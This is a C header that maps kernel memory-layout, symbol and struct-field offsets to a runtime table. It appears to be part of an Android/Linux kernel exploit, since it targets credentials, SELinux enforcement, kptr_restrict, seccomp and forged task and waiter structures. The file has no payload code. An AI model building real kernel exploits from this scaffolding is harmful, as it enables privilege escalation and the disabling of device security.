/*
 * runtime_offsets.h — Override target.h compile-time macros with
 * runtime values from the offsets table. Must be included AFTER common.h.
 *
 * All .c files should include this after common.h:
 *   #include "common.h"
 *   #include "runtime_offsets.h"
 */
#ifndef RUNTIME_OFFSETS_H
#define RUNTIME_OFFSETS_H

#include "offsets.h"

extern const struct kernel_offsets *active_offsets;

/* Memory layout */
#undef KIMAGE_TEXT_BASE
#undef P0_PAGE_OFFSET
#undef P0_PHYS_OFFSET
#undef P0_KERNEL_PHYS_LOAD
#undef KERNELSNITCH_IDENTITY_START
#undef KERNELSNITCH_IDENTITY_END
#undef DIRECT_MAP_BASE
#undef DIRECT_MAP_END
#define KIMAGE_TEXT_BASE              active_offsets->kimage_text_base
#define P0_PAGE_OFFSET                active_offsets->p0_page_offset
#define P0_PHYS_OFFSET                active_offsets->p0_phys_offset
#define P0_KERNEL_PHYS_LOAD           active_offsets->p0_kernel_phys_load
#define KERNELSNITCH_IDENTITY_START   active_offsets->kernelsnitch_identity_start
#define KERNELSNITCH_IDENTITY_END     active_offsets->kernelsnitch_identity_end
#define DIRECT_MAP_BASE               active_offsets->p0_page_offset
#define DIRECT_MAP_END                active_offsets->direct_map_end

/* Global symbol offsets */
#undef SELINUX_ENFORCING_OFF
#undef INIT_CRED_OFF
#undef INIT_TASK_OFF
#undef INIT_UTS_NS_OFF
#undef EMPTY_ZERO_PAGE_OFF
#undef ROOT_TASK_GROUP_OFF
#undef KPTR_RESTRICT_OFF
#undef SELINUX_BLOB_SIZES_OFF
#undef SECURITY_HOOK_HEADS_OFF
#undef KMALLOC_CACHES_OFF
#undef ANON_PIPE_BUF_OPS_OFF
#undef ASHMEM_MISC_FOPS_OFF
#undef ASHMEM_FOPS_OFF
#undef ASHMEM_IOCTL_OFF
#undef ASHMEM_COMPAT_IOCTL_OFF
#undef ASHMEM_MMAP_OFF
#undef ASHMEM_OPEN_OFF
#undef ASHMEM_RELEASE_OFF
#undef ASHMEM_SHOW_FDINFO_OFF
#undef CONFIGFS_READ_ITER_OFF
#undef CONFIGFS_BIN_WRITE_ITER_OFF
#undef COPY_SPLICE_READ_OFF
#undef NOOP_LLSEEK_OFF
#undef CAP_CAPABLE_ACTIVE_OFF
#undef SLIDE_NFULNL_LOGGER_OFF
#undef SLIDE_LOGGERS_0_1_OFF
#undef SLIDE_RANDOM_BOOT_ID_DATA_OFF
#undef SLIDE_SYSCTL_BOOTID_OFF
#define SELINUX_ENFORCING_OFF         active_offsets->off_selinux_enforcing
#define INIT_CRED_OFF                 active_offsets->off_init_cred
#define INIT_TASK_OFF                 active_offsets->off_init_task
#define INIT_UTS_NS_OFF               active_offsets->off_init_uts_ns
#define EMPTY_ZERO_PAGE_OFF           active_offsets->off_empty_zero_page
#define ROOT_TASK_GROUP_OFF           active_offsets->off_root_task_group
#define KPTR_RESTRICT_OFF             active_offsets->off_kptr_restrict
#define SELINUX_BLOB_SIZES_OFF        active_offsets->off_selinux_blob_sizes
#define SECURITY_HOOK_HEADS_OFF       active_offsets->off_security_hook_heads
#define KMALLOC_CACHES_OFF            active_offsets->off_kmalloc_caches
#define ANON_PIPE_BUF_OPS_OFF         active_offsets->off_anon_pipe_buf_ops
#define ASHMEM_MISC_FOPS_OFF          active_offsets->off_ashmem_misc_fops
#define ASHMEM_FOPS_OFF               active_offsets->off_ashmem_fops
#define ASHMEM_IOCTL_OFF              active_offsets->off_ashmem_ioctl
#define ASHMEM_COMPAT_IOCTL_OFF       active_offsets->off_ashmem_compat_ioctl
#define ASHMEM_MMAP_OFF               active_offsets->off_ashmem_mmap
#define ASHMEM_OPEN_OFF               active_offsets->off_ashmem_open
#define ASHMEM_RELEASE_OFF            active_offsets->off_ashmem_release
#define ASHMEM_SHOW_FDINFO_OFF        active_offsets->off_ashmem_show_fdinfo
#define CONFIGFS_READ_ITER_OFF        active_offsets->off_configfs_read_iter
#define CONFIGFS_BIN_WRITE_ITER_OFF   active_offsets->off_configfs_bin_write_iter
#define COPY_SPLICE_READ_OFF          active_offsets->off_copy_splice_read
#define NOOP_LLSEEK_OFF               active_offsets->off_noop_llseek
#define CAP_CAPABLE_ACTIVE_OFF        active_offsets->off_cap_capable_active
#define SLIDE_NFULNL_LOGGER_OFF       active_offsets->off_slide_nfulnl_logger
#define SLIDE_LOGGERS_0_1_OFF         active_offsets->off_slide_loggers_0_1
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF active_offsets->off_slide_boot_id
#define SLIDE_SYSCTL_BOOTID_OFF       active_offsets->off_slide_boot_id

/* Struct field offsets */
#undef TASK_CRED_OFF
#undef TASK_REAL_CRED_OFF
#undef TASK_PID_OFF
#undef TASK_TGID_OFF
#undef TASK_REAL_PARENT_OFF
#undef TASK_COMM_OFF
#undef TASK_TASKS_OFF
#undef TASK_ATOMIC_FLAGS_OFF
#undef TASK_SECCOMP_OFF
#undef MM_OWNER_OFF
#undef FAKE_TASK_USAGE_OFF
#undef FAKE_TASK_PRIO_OFF
#undef FAKE_TASK_NORMAL_PRIO_OFF
#undef FAKE_TASK_TASK_GROUP_OFF
#undef FAKE_TASK_PI_LOCK_OFF
#undef FAKE_TASK_PI_WAITERS_OFF
#undef FAKE_TASK_PI_TOP_TASK_OFF
#undef FAKE_TASK_PI_BLOCKED_ON_OFF
#undef WAITER_TREE_ENTRY_OFF
#undef WAITER_PI_TREE_ENTRY_OFF
#undef WAITER_TASK_OFF
#undef WAITER_LOCK_OFF
#undef WAITER_WAKE_STATE_OFF
#undef WAITER_PRIO_OFF
#undef WAITER_DEADLINE_OFF
#undef WAITER_WW_CTX_OFF
#undef CRED_UID_OFF
#undef CRED_SECUREBITS_OFF
#undef CRED_CAPS_OFF
#undef CRED_SECURITY_OFF
#undef FOPS_OWNER_OFF
#undef FOPS_LLSEEK_OFF
#undef FOPS_READ_OFF
#undef FOPS_WRITE_OFF
#undef FOPS_READ_ITER_OFF
#undef FOPS_WRITE_ITER_OFF
#undef FOPS_IOCTL_OFF
#undef FOPS_COMPAT_IOCTL_OFF
#undef FOPS_MMAP_OFF
#undef FOPS_OPEN_OFF
#undef FOPS_RELEASE_OFF
#undef FOPS_SPLICE_READ_OFF
#undef FOPS_SHOW_FDINFO_OFF
#define TASK_CRED_OFF                 active_offsets->task_cred
#define TASK_REAL_CRED_OFF            active_offsets->task_real_cred
#define TASK_PID_OFF                  active_offsets->task_pid
#define TASK_TGID_OFF                 active_offsets->task_tgid
#define TASK_REAL_PARENT_OFF          active_offsets->task_real_parent
#define TASK_COMM_OFF                 active_offsets->task_comm
#define TASK_TASKS_OFF                active_offsets->task_tasks
#define TASK_ATOMIC_FLAGS_OFF         active_offsets->task_atomic_flags
#define TASK_SECCOMP_OFF              active_offsets->task_seccomp
#define MM_OWNER_OFF                  active_offsets->mm_owner
#define FAKE_TASK_USAGE_OFF           active_offsets->task_usage
#define FAKE_TASK_PRIO_OFF            active_offsets->task_prio
#define FAKE_TASK_NORMAL_PRIO_OFF     active_offsets->task_normal_prio
#define FAKE_TASK_TASK_GROUP_OFF      active_offsets->task_sched_task_group
#define FAKE_TASK_PI_LOCK_OFF         active_offsets->task_pi_lock
#define FAKE_TASK_PI_WAITERS_OFF      active_offsets->task_pi_waiters
#define FAKE_TASK_PI_TOP_TASK_OFF     active_offsets->task_pi_top_task
#define FAKE_TASK_PI_BLOCKED_ON_OFF   active_offsets->task_pi_blocked_on
#define WAITER_TREE_ENTRY_OFF         active_offsets->waiter_tree
#define WAITER_PI_TREE_ENTRY_OFF      active_offsets->waiter_pi_tree
#define WAITER_TASK_OFF               active_offsets->waiter_task
#define WAITER_LOCK_OFF               active_offsets->waiter_lock
#define WAITER_WAKE_STATE_OFF         active_offsets->waiter_wake_state
#define WAITER_PRIO_OFF               active_offsets->waiter_prio
#define WAITER_DEADLINE_OFF           active_offsets->waiter_deadline
#define WAITER_WW_CTX_OFF             active_offsets->waiter_ww_ctx
#define CRED_UID_OFF                  active_offsets->cred_uid
#define CRED_SECUREBITS_OFF           active_offsets->cred_securebits
#define CRED_CAPS_OFF                 active_offsets->cred_caps
#define CRED_SECURITY_OFF             active_offsets->cred_security
#define FOPS_OWNER_OFF                active_offsets->fops_owner
#define FOPS_LLSEEK_OFF               active_offsets->fops_llseek
#define FOPS_READ_OFF                 active_offsets->fops_read
#define FOPS_WRITE_OFF                active_offsets->fops_write
#define FOPS_READ_ITER_OFF            active_offsets->fops_read_iter
#define FOPS_WRITE_ITER_OFF           active_offsets->fops_write_iter
#define FOPS_IOCTL_OFF                active_offsets->fops_ioctl
#define FOPS_COMPAT_IOCTL_OFF         active_offsets->fops_compat_ioctl
#define FOPS_MMAP_OFF                 active_offsets->fops_mmap
#define FOPS_OPEN_OFF                 active_offsets->fops_open
#define FOPS_RELEASE_OFF              active_offsets->fops_release
#define FOPS_SPLICE_READ_OFF          active_offsets->fops_splice_read
#define FOPS_SHOW_FDINFO_OFF          active_offsets->fops_show_fdinfo

/* FAKE_WAITER = same struct as WAITER, derive from runtime values */
#undef FAKE_WAITER_TREE_PRIO_OFF
#undef FAKE_WAITER_TREE_DEADLINE_OFF
#undef FAKE_WAITER_PI_TREE_ENTRY_OFF
#undef FAKE_WAITER_PI_TREE_PRIO_OFF
#undef FAKE_WAITER_PI_TREE_DEADLINE_OFF
#undef FAKE_WAITER_TASK_OFF
#undef FAKE_WAITER_LOCK_OFF
#undef FAKE_WAITER_WAKE_STATE_OFF
#undef FAKE_WAITER_WW_CTX_OFF
#define FAKE_WAITER_TREE_PRIO_OFF         WAITER_PRIO_OFF
#define FAKE_WAITER_TREE_DEADLINE_OFF     WAITER_DEADLINE_OFF
#define FAKE_WAITER_PI_TREE_ENTRY_OFF     WAITER_PI_TREE_ENTRY_OFF
#define FAKE_WAITER_PI_TREE_PRIO_OFF      active_offsets->waiter_pi_tree_prio
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF  active_offsets->waiter_pi_tree_deadline
#define FAKE_WAITER_TASK_OFF              WAITER_TASK_OFF
#define FAKE_WAITER_LOCK_OFF              WAITER_LOCK_OFF
#define FAKE_WAITER_WAKE_STATE_OFF        WAITER_WAKE_STATE_OFF
#define FAKE_WAITER_WW_CTX_OFF            WAITER_WW_CTX_OFF

#endif
